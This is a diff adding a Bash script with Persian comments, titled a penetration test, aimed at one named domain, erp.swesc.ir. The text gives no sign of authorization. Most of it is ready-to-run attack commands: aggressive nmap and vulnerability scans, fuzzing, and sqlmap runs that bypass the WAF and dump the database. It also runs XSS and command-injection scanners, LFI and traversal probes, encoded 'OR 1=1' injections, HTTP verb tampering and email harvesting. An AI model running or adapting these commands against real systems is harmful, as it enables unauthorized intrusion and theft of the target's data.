@@ -1,1 +1,131 @@
+#!/bin/bash
+# comprehensive_penetration_test.sh
 
+TARGET="erp.swesc.ir"
+DATE=$(date +%Y%m%d_%H%M%S)
+OUTPUT_DIR="/home/ArashKali/pen_test_$DATE"
+
+mkdir -p $OUTPUT_DIR
+
+echo "شروع تست نفوذ کامل برای $TARGET"
+echo "نتایج در: $OUTPUT_DIR"
+
+# مرحله ۱: شناسایی
+echo "در حال شناسایی WAF..."
+wafw00f https://$TARGET > $OUTPUT_DIR/waf_detection.txt
+
+echo "در حال شناسایی تکنولوژی‌ها..."
+whatweb https://$TARGET > $OUTPUT_DIR/technology_scan.txt
+
+# مرحله ۲: اسکن پورت‌ها
+echo "در حال اسکن پورت‌ها..."
+nmap -sS -sV -A -O $TARGET > $OUTPUT_DIR/nmap_scan.txt
+
+# مرحله ۳: تست SSL
+echo "در حال تست SSL..."
+sslscan $TARGET > $OUTPUT_DIR/ssl_scan.txt
+
+# مرحله ۴: فازینگ
+echo "در حال فازینگ دایرکتوری‌ها..."
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://$TARGET/FUZZ > $OUTPUT_DIR/directory_fuzzing.txt
+
+echo "تست نفوذ کامل انجام شد."
+# شناسایی WAF
+wafw00f https://erp.swesc.ir
+
+# شناسایی تکنولوژی‌های مورد استفاده
+whatweb https://erp.swesc.ir
+
+# بررسی هدرهای HTTP
+curl -I https://erp.swesc.ir
+
+# اسکن پورت‌های اصلی
+nmap -sS -sV -O erp.swesc.ir
+
+# اسکن دقیق پورت‌ها
+nmap -sS -sV -sC -A -O -p- erp.swesc.ir
+
+# اسکن SSL/TLS
+nmap --script ssl-enum-ciphers -p 443 erp.swesc.ir
+
+# اسکن آسیب‌پذیری‌های رایج
+nmap --script vuln erp.swesc.ir
+# فازینگ دایرکتوری‌ها
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://erp.swesc.ir/FUZZ
+
+# فازینگ پارامترهای GET
+wfuzz -c -z file,/usr/share/wordlists/params.txt --hc 404 https://erp.swesc.ir/page?FUZZ=test
+
+# فازینگ ساب دامنه‌ها
+wfuzz -c -z file,/usr/share/wordlists/subdomains.txt --hc 404 -H "Host: FUZZ.erp.swesc.ir" https://erp.swesc.ir
+# اسکن کامل آسیب‌پذیری‌ها
+nikto -h https://erp.swesc.ir
+
+# اسکن با host مشخص
+nikto -h https://erp.swesc.ir -useproxy http://127.0.0.1:8080
+# اسکن اولیه
+sqlmap -u "https://erp.swesc.ir/page?id=1" --level=5 --risk=3 --batch
+
+# اسکن با هدرهای کامل
+sqlmap -u "https://erp.swesc.ir/login" --data="username=admin&password=test" --method=POST --level=5 --risk=3
+
+# شناسایی دیتابیس
+sqlmap -u "https://erp.swesc.ir/page?id=12" --dbms=mysql --batch
+
+# دور زدن WAF با تکنیک‌های پیشرفته
+sqlmap -u "https://erp.swesc.ir/page?id=1" --tamper=space2comment,charencode --level=5 --risk=3
+
+# اسکن کامل
+sqlmap -u "https://erp.swesc.ir/page?id=18" --dbs --tables --columns --dump
+# اسکن کامل
+xsstrike -u "https://erp.swesc.ir/search?q=test"
+
+# اسکن پیشرفته
+xsstrike -u "https://erp.swesc.ir/search?q=test" --fuzzer --crawl
+
+# اسکن با پارامترهای POST
+xsstrike -u "https://erp.swesc.ir/login" --data "username=test&password=test"
+# Local File Inclusion
+ffuf -w /usr/share/wordlists/dirb/common.txt -u "https://erp.swesc.ir/page?file=FUZZ"
+
+# Directory Traversal
+ffuf -w /usr/share/wordlists/dir-traversal.txt -u "https://erp.swesc.ir/download?file=FUZZ"
+# اسکن خودکار
+commix -u "https://erp.swesc.ir/command?input=test"
+
+# اسکن پیشرفته
+commix -u "https://erp.swesc.ir/command?input=test" --level=3 --batch
+
+# راه‌اندازی Burp Suite
+burpsuite &
+
+# راه‌اندازی OWASP ZAP
+zap.sh -daemon -port 8080 -host 127.0.0.1
+# اسکن سریع
+zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' https://erp.swesc.ir
+
+# اسکن کامل
+zap-cli active-scan --scanners all --recursive https://erp.swesc.ir
+# تست با URL Encoding
+curl -X GET "https://erp.swesc.ir/page?id=%31%20%4f%52%20%31%3d%31"
+
+# تست با Base64 Encoding
+curl -X GET "https://erp.swesc.ir/page?data=MQ=="
+
+# تست با Unicode Encoding
+curl -X GET "https://erp.swesc.ir/page?id=\u0031\u0020\u004f\u0052\u0020\u0031\u003d\u0031"
+# تست روش‌های مختلف HTTP
+curl -X GET https://erp.swesc.ir/admin
+curl -X POST https://erp.swesc.ir/admin
+curl -X PUT https://erp.swesc.ir/admin
+curl -X DELETE https://erp.swesc.ir/admin
+curl -X PATCH https://erp.swesc.ir/admin
+
+# تست HTTP Verb Tampering
+curl -X GET -H "X-HTTP-Method-Override: POST" https://erp.swesc.ir/admin
+ودرنهایت جمع آوری اطلاعات 
+# جمع‌آوری ایمیل و ساب دامنه
+theHarvester -d swesc.ir -b all
+
+# جمع‌آوری از منابع مختلف
+theHarvester -d swesc.ir -b google,bing,linkedin
